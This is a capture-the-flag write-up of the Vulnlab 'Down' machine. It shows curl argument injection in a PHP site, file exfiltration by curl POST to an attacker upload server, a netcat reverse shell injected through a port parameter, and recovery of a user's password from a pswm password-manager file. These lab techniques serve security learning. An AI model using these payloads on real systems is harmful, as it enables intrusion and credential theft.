+++
title = '[Vulnlab] Down'
date = 2024-11-01T11:08:15+01:00
draft = false
tags = ['pentesting', 'php', 'linux', 'filter_bypass']
+++

[![Proof](/images/vulnlab_down/banner.png)](https://api.vulnlab.com/api/v1/share?id=4b2fb6e6-0ee0-4c9f-a70d-2f5d3059bcce)

# 0. Enumeration
Since itâ€™s a Linux machine, we start with a nmap scan.
```bash
nmap -Pn -iL ips.txt -oA normal -v
[...]
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Also for nicer URLs we add the ip to the `/etc/hosts` file:
```Bash
echo "$IP down.vl" >> /etc/hosts
```

Notes:
```
Services to check:
80 - HTTP

Requries Credentials:
22 - SSH
```

## 80 - HTTP

Before checking a website it's prudent to `whatweb` it.
```
whatweb down.vl
http://down.vl [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.70.199], Title[Is it down or just me?]
```

We are dealing with a `Apache Server` running Ubuntu. Let's update the notes

```
In Progress:
80 - HTTP

Requires Credentials:
22 - SSH

Information:
Ubuntu
Apache server
    -> Running PHP
    -> Web source is at `/var/www/html/index.php`
```

Now let's look at the site:
![Site](/images/vulnlab_down/site.png)

# 1. Foothold

## A - Functionality enumeration
We test a few things out on the site. This reveals
that all URLs must start with `http://` or `https://`

To fingerprint what we are dealing with we start a
`nc` listener at port 80 and enter our own IP address on the 
site.
```bash
nc -lnvp 80
```

![Nc screenshot with website input](/images/vulnlab_down/nc.png)

This reveals that the site is executing `curl [user_input]`

## B - Argument injection
After playing around in [Burp](https://portswigger.net/burp/releases/professional-community-2024-9-4?requestededition=community&requestedplatform=)
we discover that it's possible to inject arguments by adding
spaces to the command.

```html
POST /index.php HTTP/1.1
Host: down.vl
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

url=http%3A%2F%2Flocalhost%20-h
```
![-h get's us the curl help](/images/vulnlab_down/help.png)

## C - Arbitrary file read
Looking at [GTFObins](https://gtfobins.github.io/gtfobins/curl/)
we now have the possibility to upload files:

On Attacker host
```bash
python -m uploadserver 80
```
On victim
```bash
curl $ATTACKER_URL -X POST -F 'files=@/path/to/file'
```

Looking our notes, we would like to read the `/var/www/html/index.php` file

Payload
```
http://10.8.3.211/upload -X POST -F 'files=@/var/www/html/index.php'
```
Full Request
```
POST /index.php HTTP/1.1
Host: down.vl
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

url=http%3a%2f%2f10.8.3.211%2fupload%20-X%20POST%20-F%20'files%3d%40%2fvar%2fwww%2fhtml%2findex.php'
```
### Source code analysis
![index.php in VSCode](/images/vulnlab_down/source.png)
Looking at the source code we can detect a few things:
1. There is a hidden parameter `?expertmode=tcp` with more functionality
2. The `nc` command uses the wrong non-sanitized `$port` parameter.
3. The reason why the arbitrary file read works is that it uses `escapeshellcmd` which doesn't escape spaces:
![php_warning](/images/vulnlab_down/php_warning.png)


This means that we should be able to get a reverse shell with:
```bash
nc -vz $ATTACKER_IP $PORT -c bash
```

## D - Reverse Shell
On the host we create a listener on port 4444, with [penelope](https://github.com/brightio/penelope) (Netcat also works, but I like the automatic upgrade)

On host:
```bash
penelope.py -m 3 -i tun0
```

On the victim we trigger the `netcat` reverse shell.
```html
POST /index.php?expertmode=tcp HTTP/1.1
Host: down.vl
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

ip=10.8.3.211&port=4444%20-c%20bash
```

And we have a shell!

![Shell](/images/vulnlab_down/rev.png)
The Flag is located immediately in the same folder.

# 2. Privilege Escalation
## A - Enumeration
Using the `run lse` command in `penelope` (alternatively upload
[lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) and run from there), we detect that
we can read subdirectories under `/home`
![homedirectories](/images/vulnlab_down/homedirs.png)

Listing those with find:
```bash
$ find /home -type f -readable 2>/dev/null
/home/aleks/.bashrc
/home/aleks/.sudo_as_admin_successful
/home/aleks/.local/share/pswm/pswm
/home/aleks/.profile
/home/aleks/.bash_logout
```
reveals the interesting file `/home/aleks/.local/share/pswm/pswm`

## B - PSWM decode password
Googling `pswm linux` leads us to the password manager [pwsm](https://github.com/Julynx/pswm/tree/main) as well as a [pswm-decoder](https://github.com/repo4Chu/pswm-decoder/tree/main?tab=readme-ov-file)

After downloading the `pswm` file and running the `pswm-docoder` with the correct paths we get:

```bash
$ python pswm-decoder.py
Password: ******
Decoded text:
pswm	aleks	******
aleks@down	aleks	1******************E
```

Using this password we can log in as `aleks`, who has `sudo`
privileges which means we won!
```bash
$ ssh aleks@down.vl
aleks@down.vl's password: [enter password]
$ sudo -s
[sudo] password for aleks: [enter password]
```


![Victory screen](/images/vulnlab_down/victory.png)




# 99. Misc

## Other file read with `file:///path/to/file`
Instead of using an upload server it is also possible to 
read files by adding a space and giving a second parameter:

```
POST /index.php HTTP/1.1
Host: down.vl
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

url=http%3A%2F%2Fa%20file:///etc/passwd
```
![Other read](/images/vulnlab_down/other_read.png)

However, this read is less preferable, since it html-encodes the file content.

## Arbitrary file write with curl
In GTFObins there is also a reference for "File download"
meaning we can write an arbitrary file to the system.

```
curl $URL -o $LFILE
```

However, I tried the following two approaches which both didn't give code execution.
1. Writing a webshell to `/var/www/html/shell.php` - Fails because folder is not writable
2. Writing a `.ssh/authorized_keys` file - Fails because the user `www-data` has no home folder


## nc.traditional vs ncat
Different netcat versions behave differently (which took me way too much time to debug).

The challenge is using `nc.traditional` where `nc -vz -c [command]` is allowed.

However, attempting the same command in the nmap [ncat](https://nmap.org/ncat/) version does not work:
```bash
$ nc -vz 127.0.0.1 4444 -c bash
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Command execution can't be done along with option -z. QUITTING.
```
